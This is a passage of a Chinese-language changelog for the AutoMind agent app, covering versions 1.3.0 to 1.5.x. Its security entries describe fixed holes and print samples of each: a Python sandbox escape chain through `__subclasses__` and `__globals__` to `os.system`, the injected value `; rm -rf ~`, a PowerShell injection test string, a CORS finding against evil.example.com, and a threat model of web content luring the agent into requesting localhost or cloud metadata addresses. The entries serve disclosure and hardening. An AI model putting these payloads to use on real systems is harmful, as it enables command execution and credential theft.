  时间戳从不推进）；datalog 的 `^` 推导分支是 `pass`，规则**永远推不出新事实**。
  · **连带修复三处**：body 专有变量（`p(X,Y),p(Y,Z)` 里的 `Y`）不参与绑定，
  连接查询必然失配；跨 body 合并用 `{**prev,**new}` 静默覆盖，等于不校验
  连接条件；**常量与变量名混存同一字典**，常量被当变量名传给 `_match`，
  `ask("grandparent","alice","bob")` 这种不成立的查询会返回 True。
  只修 `^` 会把假阴性变成假阳性，故重写了 `_apply_rule`。
  · `derive()` 的去重用 `ask()`，而 `query()` 会应用规则 —— 对任何可推导事实
  都返回 True，导致一条也不物化。改为只查已存储事实。
- **Q1 · 聊天历史静默丢失**：`save_session_history` 的 `except: pass` 让写盘
  失败悄无声息。现在 3 次退避重试 → 仍失败则 `logger.error` + 抛
  `SessionSaveError`；WS 路径转成 `history_save_failed` 事件推前端，
  且**不中断任务**（回答已生成，不该因存档失败整体失败）。
- **Q2 · Token 预算保护空转**：`ResourceManager` 实例化后从未被调用。新增与
  用量回调对称的 `pre_call_hook`：≥80% 推 `budget_warning` 并压缩上下文，
  ≥100% 推 `budget_exceeded` 并**拒绝调用**。
  · **连带修复**：`_TokenTrackingLLM` 只代理 `__getattr__` 不代理写，
  回调全挂在包装器上、真实后端永远读不到 —— "设了但不生效"。补 `__setattr__` 转发。
  · `ContextManager.compress` 是协程，同步调用等于没压缩还泄漏协程，已改 await。
- **Q3 · 静默吞异常**：全库实测 93 处（不止 63）。**不做无差别转换** ——
  尽力而为的清理加日志只是噪音。按"失败是否真正伤到用户"筛出 10 处收敛为
  具名日志事件：任务历史落库（2）、工具禁用未生效、MCP 重连失败、
  token 记账失败、流式用量解析、项目索引缺失、三类技能加载失败。

### 体验

- **Q6 · token 数要等整段回答生成完才跳一次**：流式用量此前只在末尾的
  `<!--STREAM_USAGE:-->` 标记里带出。改用 `__init_subclass__` 给全部 provider
  统一挂旁路上报，每次调用结束推 `usage_update`，前端实时累加。
  **chunk 原样透传，标记格式未动**（符合"不改消息流格式"约束）。
- **Q7 · 任务卡住无从判断**：服务端"连上了但不吐字"时底层不超时，任务无限期
  挂着。新增单轮**硬超时**（默认 300s，流式按累计时长逐块检查）+ 每 5 秒
  **心跳事件**，前端显示"正在思考 / 正在生成回答"。
- **Q8 · 工具失败反复重试且不可见**：同一工具连续失败 3 次即**熔断**，本轮
  不再调用并把原因回给模型；`tool_error` 事件让前端标红并显示连续失败次数；
  新增 `preflight_check` 任务前自检（LLM 就绪 / 工具非空 / 项目目录可写）。

新增 58 条回归测试，全量 **669 通过 / 1 跳过**，ruff 全通过。

## [1.5.0] - 2026-08-07

**内置 12 个办公与集成工具 —— 社区版开放基础能力，进阶动作由专业版实现**

新增工具全部**默认注册**，第三方依赖走**懒加载**：只用对话功能的用户不会被拖上
一堆 Office 解析库；缺库时返回的是一句可照抄的 `pip install`，而不是让工具凭空
消失、模型只能干瞪眼。一次装齐：`pip install 'automind-agent[office]'`。

- **📊 办公四件套**
  · `excel_tool` —— 读/写/追加、列出工作表、新建、CSV 双向互转。
  公式单元格返回的是 Excel 上次保存的缓存值，读不到时**如实说明**而非假装读到。
  · `word_tool` —— 读取（段落 + 表格）、新建、追加、插表、导出纯文本。
  明确拒绝老式 `.doc` 二进制格式并提示先另存为 `.docx`。
  · `pdf_tool` —— 文本抽取、页数与元信息、合并、按页范围拆分、旋转。
  扫描件无文本层时明确告知，不返回一片空白让人以为工具坏了。
  · `email_tool` —— SMTP 发送 + IMAP 收取（标准库实现，零新增依赖）。
- **🔧 通用五件套**：`web_search`（Tavily/Serper/Brave/自建 SearXNG）、
  `http_request`、`db_query`、`file_search`、`archive`。
- **🤝 协同三件套**：`notify`（Windows toast / macOS / Linux 桌面通知）、
  `calendar`（ICS 读写，Windows 下另支持 Outlook COM）、
  `im_integration`（钉钉 / 企业微信 / 飞书 / Slack 群机器人）。

**安全上的取舍（都不是顺手加的）**
- `http_request` / `im_integration` 默认**拒绝私网、回环与云元数据地址**。
  模型完全可能被网页内容诱导去请求 `http://127.0.0.1:8765/api/run`（本机的
  AutoMind 自己）或 `169.254.169.254`（云实例凭据）。重定向**逐跳复检** ——
  否则一个公网 URL 302 到 127.0.0.1 就绕过了首次校验。
- `archive` 解压做 zip-slip 校验（归档成员名是攻击者可控的），拒绝含链接项的
  tar，并设解压体积上限防压缩炸弹。
- `db_query` 社区版走 SQLite 的 `mode=ro` 只读连接 —— 由 SQLite 自己保证只读，
  比在应用层猜 SQL 可靠；表名不能参数化绑定，故用严格正则白名单替代。
- `email_tool` / `im_integration` 外发不可撤回，定档 DANGEROUS 逐条审批。
  **刻意不做群发**：收件人硬上限 20，超出直接拒绝。一个能被模型驱动的无限群发
  接口就是垃圾邮件基础设施 —— 这不是版本差异能解决的问题，专业版同样不解锁。
  邮箱密码只从环境变量读，不接受作为参数传入，也不写进任何返回值或日志。
- `notify` 的 Windows 实现走 PowerShell，标题/正文经引号转义 + `-EncodedCommand`
  传入。已实测 `'; Write-Output INJECTED; '` 这类载荷被当作纯数据，不会执行。

**版本分级**：分级粒度是**动作**而非整个工具 —— 社区版能真正把表格读出来、
把报告写出去。进阶动作（Excel 样式、Word `{{占位符}}` 模板套打、PDF 水印与
AES-256 加密、非 SQLite 数据库与写操作）由 `automind_pro` **实现并委派执行**：
社区版里没有对应代码，因此不存在"买了却提示不支持"的占位卖点；
测试里有一条专门守着这件事（声明为进阶的动作，pro 侧必须都有实现）。

## [1.4.6] - 2026-08-07

**补上 v1.4.5 CORS 收紧拦不住的那条路：WebSocket 跨源劫持**

- **🚨 WebSocket 来源校验改为默认开启**：`/ws` 是任务执行主通道
  （`{"action":"run"}`），而此前的校验以"配置了 `AUTOMIND_ALLOWED_ORIGINS`"
  为前提，**默认完全不校验**。关键在于 **WebSocket 不受同源策略约束** ——
  浏览器对 `ws://` 不做 CORS 预检，任何网页都能直接
  `new WebSocket("ws://127.0.0.1:8765/ws")`。也就是说 v1.4.5 收紧 CORS
  **并拦不住这条路**：用户只要访问一个恶意页面，那个页面就能驱动本机 Agent
  跑命令、读写文件，而本地默认又不开鉴权。
  现在与 CORS 同策略：无 Origin（CLI/SDK/curl）放行；本机来源放行；
  显式配置的来源放行；其余一律拒绝并记日志。
  已覆盖 `localhost.evil.com` 这类前缀伪装（正则两端锚定）。

## [1.4.5] - 2026-08-06

**安全加固第二轮：审批三连 fail-closed · CORS 收紧 · 目录锚定 · 默认鉴权引导**

- **✅ 审批 fail-closed 三连补齐**：v1.4.4 只修了 `agent.py` 一处，另两处仍在放行 ——
  · `react_executor._gate`：**没接审批回调就直接 `return True`**（注释写着"自主运行
  不阻塞"，但真正表达自主运行的方式是把审批模式设为自动/全批准，那样
  `permissions.check()` 根本不会返回 `ask_user`，压根到不了这里；靠"回调恰好没接"
  放行，等于让配置疏漏静默变成放权），且回调异常同样 `return True`；
  · `plan_executor._execute_goal`：条件写成 `ask_user and on_approval_needed` ——
  **没有回调时整个审批判断被短路跳过**，需要人工确认的步骤直接执行了。
  现在三处一致：没有审批通道 = 拒绝，回调异常 = 拒绝，并给出可操作的说明。
- **🌐 CORS 默认收紧（比 `*` 更危险的组合）**：此前 `allow_origins=["*"]` +
  `allow_credentials=True`。这个组合的实际行为不是"发 `*`"——Starlette 在
  credentials 打开时会把请求方 Origin **原样回显**。实测 `https://evil.example.com`
  能拿到 `Access-Control-Allow-Origin: https://evil.example.com` +
  `Allow-Credentials: true`，即**用户浏览的任何网页都能跨站调用本机 AutoMind 并读取
  响应**（`/api/run` 等全部在内），而本地默认又不开鉴权。现在默认只信任本机来源
  （localhost / 127.0.0.1 / [::1]，任意端口）；显式配置 `AUTOMIND_CORS_ORIGINS`
  才放行其它来源，其中若含 `*` 则强制关闭 credentials。
- **📁 目录浏览根锚定**：v1.4.4 只做了来源检查，通过之后仍可用绝对路径漫游整块磁盘。
  现在锚定到**主目录 / 当前项目 / 已配置工作区**（可用 `AUTOMIND_FS_ROOTS` 追加），
  越界返回 403；列表项逐一过滤，向上导航到锚点父级时只会看到通往锚点的那条路
  —— 实测 `C:\` 从 22 个子目录收敛到 1 个。
- **🔑 默认鉴权引导**：`AUTOMIND_AUTH_TOKEN` 默认空 = 完全不鉴权，而 `--host 0.0.0.0`
  只是一句话的事，一旦这么起，局域网内任何人都能直接驱动这台机器上的 Agent。
  现在：绑本机保持零摩擦（仅提示一行）；**绑非本机且未设令牌时自动生成随机令牌**
  并持久化、在启动横幅里醒目打印。默认值不该让"图省事"直接等于"裸奔"。
- **🔒 `/api/integrations/continue` 按泄密端点处理**：该端点会把**明文访问令牌**写进
  返回的 YAML（Continue.dev 需要）。现在未配置令牌时只接受本机请求，并加
  `Cache-Control: no-store`，避免局域网内探明服务地址、模型名与"当前未开启鉴权"。
- **🧪 修复过时测试断言**：`TestContinueConfig` 用的 `TestClient` 默认 `client.host`
  是 `"testclient"` 而非回环地址，新的本机校验会拒绝它 —— 改为显式用 `127.0.0.1`
  构造，更贴近真实调用场景；并补上远程拒绝与 no-store 两条边界用例。
- **📖 手册更新日志同步本版**。

## [1.4.4] - 2026-08-06

**安全加固专版：沙箱逃逸 / 命令注入 / 审批放行 / 目录枚举**

本版四个问题都先写了 PoC 复现、确认成立后再修，并全部固化为回归测试。

- **🔒 Python 沙箱可逃逸（最高危，已重写）**：旧实现在**同进程** `exec`，实测四条
  路径全部成立 ——
  · `import pathlib` 直接写盘（PoC 已真实落地文件）；
  · `pathlib.os` / `uuid.os` / `random._os` / `doctest.os` 直接拿到完整 `os`；
  · `enum.bltns` 直接拿到 `builtins`（`open`、`__import__` 全回来了）；
  · `().__class__.__base__.__subclasses__()` → **554 个类可达**，经
  `_wrap_close.__init__.__globals__` 摸到 `os.system`，即**任意命令执行**。
  根因有两层：**按模块名做白名单是无效的**（标准库普遍把 `os`/`sys`/`builtins`
  当普通属性挂着，放行一个模块几乎等于放行整个解释器），且**同进程 exec 无法隔离**
  （对象图连通，沿属性总能走回 `builtins`）。现改为三层防御：
  ① 静态 AST 校验（拒绝下划线属性访问，一举封死 `__class__`/`__globals__`/`_os`
  这一整类穿越；拒绝 `eval`/`exec`/`open`/`getattr`/`__import__` 等）；
  ② 受限运行时（白名单 builtins + 模块代理，模块型属性一律不透出）；
  ③ **独立子进程**执行（`python -I -S`）。
  同时修掉一个真实可用性缺陷：旧实现用 `to_thread`+`wait_for`，超时只是**放弃等待**，
  线程仍在空转 —— `while True: pass` 实测把进程挂死 2 分钟无法回收；现在子进程会被
  真正 kill。POSIX 下另加 CPU/内存/文件大小/fork 的 rlimit。
  **边界说明**：子进程仍以当前用户身份运行，本工具不提供操作系统级隔离
  （容器 / seccomp）。它拦的是"模型写出的代码越权"，不是有确定攻击意图的本地攻击者；
  要跑不可信代码请在容器中部署。
- **💉 命令注入（test_runner）**：`pattern` 由模型可控却被直接拼进 shell 字符串并以
  `shell=True` 执行 —— 传 `; rm -rf ~` 即可注入，且拼出的整条命令不像危险命令，
  terminal 的高危正则也拦不住。现改为**argv 列表 + `shell=False`**，并对 `pattern`
  做严格白名单（只允许字母数字与 `. _ - * ? [ ] /`）；非法即拒绝，不执行任何命令。
- **✅ 审批静默放行（fail-open → fail-closed）**：`_on_approval_needed` 此前
  `except Exception: return True` —— 回调一出错就默认放行，而最常见的出错原因恰恰是
  **前端断开**，于是"用户关掉页面"反而变成"后续敏感操作全部自动获批"，
  「询问」模式在最需要它的时候等同于「全批准」。现在异常一律按**拒绝**处理并向界面
  发出 `approval_failed` 事件说明原因。同时修复 CLI 审批的两处默认放行：
  **直接回车不再等于批准**，且非交互环境（服务端/GUI/CI）直接拒绝而不是傻等 `input()`。
- **📁 目录枚举（/api/fs/list）**：此前可列举任意绝对路径 —— 绑 `0.0.0.0` 又没配
  `auth_token` 时，局域网内任何人都能枚举整个磁盘。现在：**配了令牌 → 按令牌鉴权；
  没配令牌 → 只接受本机请求**；另加系统敏感目录（System32、/etc、/root、.ssh 等）
  硬拒绝。本机目录选择器的正常使用不受影响。
- **📖 手册更新日志同步本版**。

## [1.4.3] - 2026-08-05

**输入框被挤出视口的布局修复 · 任务历史可搜索可分页 · 执行进度轻量指示**

- **🩹 修复长会话把输入框挤出界面（布局根因）**：对话面板根容器只设了
  `minWidth: 0`，**漏了 `minHeight: 0`**。flex 子项的自动最小尺寸是 `auto`
  （即"不得小于内容高度"），消息一多，面板就被内容撑破父容器 ——
  实测 80 条消息时面板高 **11821px**、而可用高度只有 648px，`.messages`
  因此拿不到受限高度、`overflow-y:auto` 永远不触发，输入框被顶到
  y=11876 完全看不见。补上 `minHeight: 0` 后同样 80 条消息：面板 798px、
  消息区正常滚动（11750 > 727）、输入框稳定可见。另在 CSS 层加
  `.view-slot > * { min-height: 0 }` 作为结构性兜底，防止同类回归。
- **🔍 任务历史可搜索 + 分页（不再全量渲染）**：
  · 此前只请求默认的最近 **50** 条，而服务端实际保留 **200** 条
  （`_HISTORY_CAP`）—— 另外 150 条在界面上根本够不着，界面却还写着"已持久化，
  不会丢"。现在一次取满 200 条；
  · 新增**关键词搜索**（同时匹配任务正文与产出，命中处高亮）、**模式筛选**、
  **成功/未完成筛选**，并显示"筛选后 / 总数"；
  · 改为**只渲染当前页**（每页 20 条）+ 分页器，不再一次性把全部记录铺成卡片；
  · 筛选条件变化时自动回到第 1 页，避免停在空白尾页；
  · 「重跑」定位输入框的选择器收紧为 `.input-inner textarea` —— 页面上现在还存在
  消息内联编辑的 textarea，原来的 `querySelector('textarea')` 会填错框。
- **⏱ 执行进度轻量指示**：观测中心的 DAG 信息更全，但普通用户不知道有那个页面，
  跑任务时也不会切过去，长任务在对话区看起来就像卡住了。现在输入框上方常驻一条
  进度指示：**阶段 · 第 X / N 步 · 当前在做什么 · 已耗时**，外加直达观测中心的
  「查看详情」。工作模式按计划步骤推进，协同模式按专家分工，循环模式按轮次；
  对话/编程模式没有预生成的计划，**不编造百分比**，改用流动条表示"在动但总量未知"。
  进度在 `setRunning(false)` 这个所有终态的必经之路上统一清除，
  不会漏某条路径而永远停在"第 3/7 步"。
- **📖 手册更新日志同步本版**。

## [1.4.2] - 2026-08-05

**消息可编辑/删除 · 断线可视化 · 恢复语义纠正 · 升级退出码修复 · 界面精修**

- **✎ 消息编辑与删除**：气泡悬停浮出操作条（复制 / 编辑 / 删除）。此前发错问题
  只能"复制原文 → 手动改 → 重发"，长会话里尤其折腾。编辑用内联输入框
  （Enter 发送 / Esc 取消），**重发时自动移除该条及其之后的消息** —— 问题都改了，
  基于旧问题产生的回答留着只会让上下文自相矛盾。删除带二次确认。
  顺带修掉 store 里 `remove()` 不落盘的问题：删完刷新一下消息又回来了。
- **🔌 断线重连的可视状态**：此前只在顶栏留一个灰色「○ 未连接」，用户往往是
  "发消息没反应"才察觉，也不知道系统其实正在自动重连。现新增：
  · 顶部横幅，含**重连倒计时**与已尝试次数，并提供「立即重连」跳过退避等待；
  · 顶栏状态徽标区分「⟳ 重连中」（黄）与「○ 未连接」（红），不再是灰底；
  · 重连成功给一条"已重新连接"提示，让中断有始有终；
  · `setRunning` 不再在链路仍断开时把状态覆盖成"已连接"（会谎报连上）。
- **⚠ 任务执行中断线不再卡死**：后端把执行绑在该条 socket 上，连接一断结果就
  再也送不回来了，而前端 `running` 一直是 true —— 输入框永久 disabled，
  既看不到结果也没法重发，表现为"卡在执行中不动"。现改为落一张失败卡片
  （带重跑入口）并解锁界面。
- **🩹 纠正"继续此任务"的语义（避免误导）**：核对后确认**后端没有可对接的断点
  恢复协议** —— 检查点是在 `agent.py` 第 7 步、即一次运行**成功结束后**才写的，
  任务失败时压根不会留下检查点；`resume_from_checkpoint()` 自身最终也是
  `run("继续执行此前未完成的任务：…")` 这样的前缀重发；而 `server.py` 里
  没有任何 checkpoint 相关代码，WS 通道从未暴露过检查点。既然如此，
  按钮文案就不该暗示"断点续传"：改为 **「▶ 检查现状后接着做」** 与
  **「↻ 从头重跑」**，并加一行说明"两者都会重新执行一次任务；已写出的文件不会
  被回滚"。附加提示词也从"不要重做已完成的部分"改成"请先检查实际进度，
  已经做好的部分不必重做" —— 能不能真跳过取决于模型的核对结果，不该承诺死。
- **🔢 修复升级安装退出码记错**：`if not %RC%==0 ( … set RC=%ERRORLEVEL% )` 是无效
  写法 —— cmd 把整个 `( )` 块一次性解析完再执行，块内的 `%ERRORLEVEL%` 在解析那刻
  就被展开成"重试之前"的旧值。实测：静默失败 rc=5、可见重试**成功** rc=0 时，
  日志仍记 `exit_code=5`，装成了却显示失败，排障时直接把人带偏。改为块外
  `set RC2=%ERRORLEVEL%` 再有条件回写（实测三种场景均正确）。
- **🎨 界面精修**：沿用既有设计语言，只在质感层面收紧 —— 气泡改双层阴影
  （边缘更利落）、悬停 1px 轻微抬起、头像加内描边避免与气泡糊在一起、
  滚动条静止时隐入、输入区聚焦时整条底栏提亮、发送按钮加高光层、
  数字统一等宽字形。另补上**全局 `:focus-visible` 焦点环** —— 此前多处
  `outline:none`，纯键盘操作时看不出焦点在哪。
- **📖 手册更新日志同步本版**。

## [1.4.1] - 2026-08-05

**修复"点升级后应用消失" · 输入框草稿保护 · 任务失败可一键恢复**

- **🛠 修复升级后应用不再启动（关键）**：桌面版是无控制台的 GUI 进程，升级批处理
  又以 `DETACHED_PROCESS` 启动 —— 此前调用 `Popen` 时**没有显式给 stdin/stdout/stderr**，
  子进程继承到一组无效句柄，脚本里的 `2>nul`、`>>"%LOG%"`、`tasklist | find` 这些
  重定向与管道**全部失败**，批处理立刻以退出码 1 夭折。安装器根本没被执行到，
  更走不到最后那句"重新拉起应用" —— 用户看到的就是"点了升级，应用退出，再也没回来"。
  已复现确认：父进程为 `pythonw.exe` 时，不给句柄 cmd 必以 rc=1 失败、脚本一行没跑完；
  给了句柄则 rc=0 跑到最后。（此前怀疑的"`write_text` 换行转换导致 `\r\r\n`"经实测
  **不是**原因，cmd 能容忍该行尾；但仍改为 `newline=""` 写入以消除隐患。）
- **升级脚本三重兜底**：静默安装失败时自动改用可见模式重试一次（装在 `Program Files`
  需要 UAC 提权，而 `/VERYSILENT` 下提权界面出不来，必然静默失败）；安装前清理残留
  实例并启用 `/FORCECLOSEAPPLICATIONS`；**无论成败最后都把应用拉起来**（装成了是新版，
  没装成是旧版）。等待旧进程退出设 120 秒上限，不会无限空转；改用 `ping` 延时替代
  需要控制台的 `timeout`。安装日志与执行轨迹（`trace.txt`）留在临时目录便于追查。
- **✍ 输入框草稿自动保存**：此前 textarea 是非受控的且**没有任何 onChange 回写**，
  `inputDraft` 只在发送时被清空、从未被写入，也从不落盘 —— 切模式/切视图/关窗口
  一律丢字。现改为停顿 400ms 落盘一次（按会话+工作区隔离），失焦、切标签页、
  关窗口、组件卸载时立即补存；语音听写与模板填入的内容一并保护。
  草稿与"上次任务"另存一个 key，不参与消息列表按体积截断的逻辑。
- **🎯 打开即聚焦**：进入对话区、切换模式、任务跑完后自动把光标交还输入框；
  有弹窗/预览打开时不抢焦点。
- **⧉ 自己发的提问也能复制**：复制按钮此前只挂在 agent 消息上。同时改为复制
  **Markdown 原文** —— 旧实现取 `bubble.innerText`，会把复制按钮自己的 "⧉" 字形
  一起带走、并丢失代码块原始格式。新增 `lib/clipboard.ts`，在 `navigator.clipboard`
  不可用时（局域网 http 访问不是安全上下文）回退到 `execCommand`。
- **🚑 任务失败有了恢复入口**：`task_error` / `task_cancelled` 此前只追加一行
  `❌ **错误**` 文本气泡，续跑气泡还要求"当前正好在该模式的对话视图"才出现，
  且依赖**不持久化**的 `lastTask` —— 重启后按钮还在却只会报"没有可继续的任务"。
  现统一落成一张失败卡片：可展开完整报错、**▶ 继续此任务** / **↻ 重新执行** /
  **⧉ 复制错误**，并针对 Key 失效、限流、超时、网络不通、上下文超长给出下一步建议。
  **任务原文写进卡片自身**，`lastTask` 也一并持久化，重启应用后依然能续跑。
  顺带修掉发送按钮 `onClick={send}` 把 MouseEvent 当参数传入的隐患，
  以及续跑时 `send` 闭包里模式取到旧值的问题（改为发送时从 store 现取）。
- **📖 手册新增「13 · 更新日志」章节**：更新日志可在手册内直接查阅（HTML 与 Markdown
  两版同步）；顺带修正 Markdown 版手册中一直停在 v1.2.0 的版本标注。

## [1.4.0] - 2026-07-30

**四项体验增强：字号调节 · 无闪烁切换 · 完整快捷键系统 · 任务完成通知**

- **🔤 字号调节**（设置 → 通用设置 → 🎨 界面偏好）：85%~130% 无级调节，
  `Ctrl+=` / `Ctrl+-` / `Ctrl+0` 也可直接调。基准取 **16px**（=浏览器默认），
  保证"标准"档与升级前**像素级一致**，不会悄悄改变老用户的界面。antd 组件用的是
  px token、不随根字号走，故一并同步缩放，避免自有样式变大而组件纹丝不动的割裂感。
- **✨ 消除切换时的黑屏闪烁**（根因修复）：此前 `App.tsx` 里是
  `ViewComp ? <View/> : <ChatPanel/>`，**每次切视图都把整个 ChatPanel 卸载再重建**。
  会话一长，这次同步卸载+重建要占掉好几帧，期间浏览器没有内容可画，露出近黑的
  `--bg0` 底色 —— 用户看到的就是"黑屏闪几下"。改为 ChatPanel **常驻挂载、只切显示**，
  DOM 不再重建（实测切换前后是同一个 DOM 节点），顺带解决了切回对话时滚动位置丢失。
  另给 `html` 补上与页面一致的底色，并新增「减少动效」开关（同时尊重系统级
  prefers-reduced-motion）。
- **⌨ 完整快捷键系统**：此前全应用只有 Enter / Shift+Enter 两个键。现新增 19 项
  全局快捷键 —— 新会话、模板库、设置、工作区、停止任务、切模式、切视图、调字号、
  切主题等，按 `?` 或从侧栏「⌨ 键盘快捷键」查看。帮助弹窗内容**由注册表直接生成**，
  与实际生效的按键同源，杜绝"文档写了却按不动"。
  细节：带修饰键的组合在输入框里照常生效不打断打字；`?` 这类单字符键让位给输入；
  中文输入法组词过程中（`isComposing`）不抢键；弹窗打开时只放行 Esc。
  另外，旧版手册里写着却**从未实现**的 `Ctrl+.`（中断）与 `Ctrl+L`（新会话）
  一并作为别名支持 —— 照着文档按的人不该扑空。
- **🔔 任务完成桌面通知**：长任务跑完发系统通知，解决"发个 5 分钟的任务切走干别的，
  回来才发现早就完成了"。**只在窗口不可见时**提醒（正盯着界面时界面已经把结果摆在
  眼前，再弹通知纯属打扰），点通知直接跳回应用；完成/失败/中断三种终态都会通知，
  正文带耗时与步骤数。权限申请挂在设置开关上（浏览器要求用户手势触发），
  被拒绝时给出明确的补救指引。
- **文档**：使用手册补齐快捷键全表与「界面偏好」章节，并修正其中**从未实现**的
  快捷键描述；手册版本号同步到 v1.4.0（此前一直停在 v1.2.0）。

## [1.3.2] - 2026-07-29

**三平台安装包 · 兼容版界面补齐升级提示**

- 首个三平台同时发布的版本：Windows（Certum 签名）/ macOS（通用二进制 DMG，
  ad-hoc 签名）/ Linux（.deb, amd64）。v1.3.1 只发了 Windows。
- **修复：兼容版界面收不到升级提示**。`/legacy` 经典界面此前**完全没有版本检查**
  —— 而被内核预检、错误页与桌面版自愈链路由到这里的，正是"装了新版打不开、
  或内核过旧"的那批用户：最该升级的人反而被永久困在旧版本上。现补齐
  `static/js/update.js`：启动 3 秒后静默检查（每会话只提示一次）、常驻升级横幅
  （显示版本号、包大小与更新说明）、桌面版一键升级并实时显示下载速度/线路/重试
  次数，设置菜单也新增「🔄 检查更新」手动入口（已是最新会给回执，不再点了没反应）。
  该文件刻意用 ES5 写法（`var`/`function`/字符串拼接）而非其余模块的 ES6 风格 ——
  它要在"连 React 产物都跑不起来"的老内核上工作，用了模板字符串就会整体解析失败，
  那正是它要解决的问题本身。

## [1.3.1] - 2026-07-28

**修复：升级后部分电脑「⚠ 界面未能加载」· 界面兼容性全面加固 · 在线升级可靠性**

### 在线升级：下载提速约 5 倍 + 断点续传 + 三重校验

- **多镜像并发择优**：直连 GitHub 在国内常年 <0.5 MB/s 且易断，30MB+ 的安装包
  因此频繁下载失败。现在把直连与多个公共镜像一起**并发探测，取最先响应的线路**
  下载 —— 镜像可用性因地区/时段剧烈波动，固定顺序会被队首的慢镜像拖死，让网络
  自己投票才稳。实测本机 **0.42 → 2.18 MB/s（约 5 倍）**。
  可用 `AUTOMIND_UPDATE_MIRRORS` 覆盖（逗号分隔；填 `direct` 只走直连）。
- **断点续传 + 自动换线路重试**：断链后从**已落盘的字节数**继续（HTTP Range），
  最多重试 6 次并轮换镜像；读超时即判定连接卡死并重试，不再永远挂在一个不再吐
  数据的连接上。实测 32.8MB 的包从 12MB 处续传，只补下 20.8MB，字节与完整下载
  完全一致。服务端无视 Range 返回 200 时会从头重写，不会把两段拼成坏文件。
- **安装前三重校验**（原先只有签名一项）：**字节数**（防截断）→ **SHA256**
  （基线取自官方 API 的 `SHA256SUMS` 资产）→ **Authenticode 签名**（同发布者）。
  校验不过立即删包，避免下次续传接在坏文件后面。版本与校验基线**只认 GitHub
  官方 API**，镜像仅搬运字节 —— 镜像作恶也无法让被改过的包通过校验。
- **启动即提示新版本**：桌面版启动后台强制刷新一次版本检查。此前缓存过期时，
  界面 3 秒后那次查询要现场联网，慢甚至超时，用户**根本收不到升级提示**。
- **安装失败不再"点了升级就消失"**：升级批处理无论安装成功与否都把应用拉回来
  （成功是新版、失败是旧版），并记录 Inno 安装日志与退出码
  （`%TEMP%\AutoMindUpdate\install.log`）便于追溯。
- **修复**：升级批处理此前硬编码 GBK 写盘，非中文 Windows 上含非 ASCII 字符的
  路径会被写坏导致升级静默失败；改用当前区域的首选编码（cmd.exe 的读取编码）。
- **修复**：`apply` 用的是 6 小时缓存里的下载地址与元数据，重新发包后会指向失效
  地址；改为先强制刷新，刷新失败再退回缓存（一次网络抖动不该让升级直接失败）。
- **界面**：下载中显示实时速度、已下载/总量、当前线路与重试次数（30MB 的包在弱
  网下要下几分钟，没有反馈用户只会以为卡死）；mac/Linux 桌面版给出发布页下载入
  口而非无效的"一键升级"。
- **多平台资产识别**：`check()` 按当前平台匹配安装包（`.exe`/`.dmg`/`.deb`），
  mac/Linux 用户也能看到正确的版本与包大小。

### 界面兼容性

- **修复（根因）**：升级安装后，部分电脑打开即报「界面未能加载 …
  `/static/dist/assets/index-XXXX.js`」。根因是**浏览器缓存了旧版入口页**：
  入口页引用带内容哈希的 `index-<hash>.js`，而旧版本对 HTML 只下发
  `no-cache`，HTML 仍会落盘缓存；升级后 WebView2/Edge 可能继续吐出上一版
  HTML，其引用的旧哈希 JS 已随新版本删除 → 404 → 白屏兜底提示。
  （线上报错里的 `index-DWfKFszJ.js` 正是 v1.2.0 的产物哈希，v1.3.0 已不含。）
  现按资源类型分档下发缓存策略（`server_web.py`）：
  - HTML 文档（`/`、`/legacy`、`/manual`）→ `no-store`，**不落盘即不可能
    再读到旧版本**；
  - 内容哈希产物（`/static/dist/assets/*`）→ `immutable` 长缓存，文件名即
    指纹，长缓存零风险且省掉每次启动的 304 协商；
  - 其余静态资源 → `no-cache`（协商缓存），语义不变。
- **新增 `/legacy` 兼容版界面**：经典原生 JS 界面的固定入口，不依赖任何
  构建产物与 ES 模块，功能与主界面一致 —— 老内核与各级兜底的最终落点。
- **前端启动自愈**（`web/index.html`）：
  - **内核能力预检**：不支持 ES 模块 / 现代语法时，直接切到 `/legacy`，
    不再让用户对着"正在加载…"干等到超时。探针独立成 `<script>` 块，老内核
    只会让该块解析失败而不波及兜底逻辑；不用 `eval`/`new Function` 探测
    （页面 CSP 未开 `unsafe-eval`，否则会误判现代浏览器）。
  - **陈旧缓存自愈**：产物 404 时自动做一次带缓存穿透参数的硬刷新，
    **已被污染的机器无需任何手动操作即可恢复**；`sessionStorage` 守卫确保
    只刷一次，不会陷入刷新循环。
  - **错误页可操作化**：区分「缓存陈旧 / 内核过旧 / 运行时异常」给出对应
    话术，并提供「刷新重试 / 打开兼容版界面 / 复制诊断信息」三个按钮。
- **产物完整性守卫**：`/` 会校验入口页引用的哈希文件确实存在，缺失（打包
  漏拷、增量构建残留）时回退经典界面 —— 用户拿到的始终是可用界面而非错误页。
- **构建基线下调** `es2020` → `es2017`：可选链 `?.`/空值合并 `??` 需
  Chromium 80+，而企业机器上被组策略钉住的 WebView2 可能停留在更早内核；
  es2017 只要求 Chromium 55+，覆盖面显著更广，体积代价可忽略。同时开启
  modulepreload polyfill。
- **桌面版 WebView2 加固**（`desktop/main.py`）：
  - **升级即清缓存**：版本号变化时清一次 WebView2 HTTP/代码缓存，主动治好
    已被污染的机器；只删缓存目录，Cookies / Local Storage 等用户态**原样
    保留**（不掉登录态、不丢本地设置）。
  - **自愈链细化**：主界面未挂载 → ① 清缓存重试 → ② 切兼容版界面 →
    ③ 落禁 GPU 标记并降级系统浏览器，逐级都比上一级更可能成功；
    渲染探测同时认 React 界面与经典界面，避免切到兼容版后被误判成白屏。
  - **运行时版本检测**：读取 WebView2 Evergreen 版本并记入日志；内核过旧
    直接加载兼容版界面。读不到版本时不判定为旧，避免误伤。

## [1.3.0] - 2026-07-26

**观测中心：执行流程可视化（DAG）+ 实时看板 · 三平台安装包**

- **📈 观测中心**（社区版起可用，`core/observability.py` + 侧边栏新视图）：
  把 Agent 的执行过程实时画成 DAG —— 任务 → 计划步骤 → 工具调用三层，
  六种状态配色（待执行/执行中/成功/失败/回溯/已中断），执行中节点带呼吸动效，
  点节点看类型/工具/耗时/失败原因，实时统计步骤数、工具调用、失败与回溯。
  图按**计划树的真实层级**展开：同级步骤并列（实测常并行/交错执行），
  不再串成一条并不存在的先后链；工具调用按事件携带的 `goal_id` 归属到所属
  步骤，步骤窗口外的调用如实挂在根节点。前端由 WebSocket 事件就地累积
  （零轮询、真正实时），刷新页面自动从 `/api/observe/dag` 补回当前任务的图。
  DAG 用原生 SVG 手绘，**未引入任何前端图形库**（桌面版离线分发，不增体积）。
  - **社区版**：仅当前任务、只读、不落盘、无历史与看板；
  - **专业版**：实时看板（成功率、平均/P50/P95 耗时、工具热度与失败率、
